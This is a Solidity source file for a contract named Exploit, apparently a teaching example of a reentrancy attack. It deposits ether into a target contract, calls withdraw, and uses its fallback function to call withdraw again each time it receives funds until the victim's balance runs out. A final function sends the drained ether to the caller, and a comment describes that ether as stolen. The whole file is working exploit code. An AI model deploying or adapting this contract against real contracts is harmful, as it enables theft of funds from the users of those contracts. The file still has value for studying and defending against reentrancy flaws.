pragma solidity ^0.5.0;

// Define the interface of the contract we want to attack (abstract contract in solidity >= 0.6)
// When define an interface, the methods must be declared as external

interface targetInterface {
    function deposit() external payable;
    function withdraw(uint withdrawAmount) external;
}



contract Exploit {

  // We set the interface giving "victim" as name and a 0x0 address
  targetInterface victim = targetInterface (0x0);

  //We set the amount of ether we want to withdraw
  uint256 oneToken = 1 ether;


  constructor (address _victimAddress) public {

      // We set the victim addres (contract address of our target)
      victim = targetInterface (_victimAddress);
  }


  // deposit () allows our contract to deposit funds into out traget
  function deposit () public payable {
      victim.deposit.value(oneToken)();
  }

  // attack () allows us to call withdraw (). This will be done only once.
  function attack () public payable {
      victim.withdraw(oneToken);
  }

  // returns the balance of our target
  function getTargetBalance () public view returns (uint256) {
      return address(victim).balance;
  }

  // we can withdraw the stolen funds
  function withdrawFunds () public {
      msg.sender.transfer(address(this).balance);
  }


  // Fallback function will be called each time that victim sends us ether
  function () external payable {
      if(address(victim).balance >= oneToken){
          victim.withdraw(oneToken);
      }
  }
}
